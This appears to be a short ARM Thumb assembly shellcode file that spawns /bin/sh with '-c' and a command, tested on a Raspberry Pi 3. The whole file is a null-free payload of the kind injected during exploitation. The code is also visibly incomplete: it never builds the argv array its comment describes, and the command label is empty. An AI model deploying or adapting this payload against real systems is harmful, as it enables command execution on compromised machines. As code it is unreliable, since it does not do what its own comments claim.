/**
  execute command using /bin/sh
  tested with linux running on raspberry pi 3 

  http://modexp.wordpress.com/  
*/

    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    add    r3, pc, #1
    bx     r3
    
    .code 16
    // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
    eor    r2, r2, r2     // r2 = NULL
    
    adr    r0, sh         // r0 = "/bin/sh"
    strb   r2, [r0, #7]   // add null terminator

    mov    r1, #'-c'    
    mov    r7, #11        // r7 = execve
    svc    1
    nop                   // align by 4 bytes
sh:    
.ascii "/bin/shX"
cmd:
